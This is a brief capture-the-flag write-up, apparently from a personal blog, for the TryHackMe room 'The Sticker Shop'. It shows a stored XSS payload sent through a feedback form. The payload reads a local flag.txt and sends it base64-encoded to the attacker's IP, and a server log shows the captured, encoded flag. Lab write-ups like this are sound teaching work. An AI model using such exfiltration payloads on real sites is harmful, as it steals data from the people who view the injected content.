---
title: The Sticker Shop
description: 'Basic XSS in through a form'
pubDate: 2024-12-16
category: 'tryhackme'
image: 'https://tryhackme-images.s3.amazonaws.com/room-icons/618b3fa52f0acc0061fb0172-1718377390091'
---

There is only one form that takes user input, it also says: `Thanks for your feedback! It will be evaluated shortly by our staff` at the bottom, which is a big hint that there is some interaction with the data that is sent through the form.

In the description of the machine we get a hint as to where the `flag.txt` should be.

With some testing we see that the form executes any Javascript we provide, this way we can get the flag through the feedback form.

```html
<script>
fetch('http://127.0.0.1:8080/flag.txt')
.then(r => r.text())
.then(text => fetch('http://10.9.2.78/?' + btoa(text)))
</script>
```

The response:

```
10.10.151.94 - - [16/Dec/2024 12:04:30] "GET /?VEhNezgzNzg5YTY5MDc0ZjYzNmY2NGEzODg3OWNmY2FiZThiNjIzMDVlZTZ9 HTTP/1.1" 200 -
```
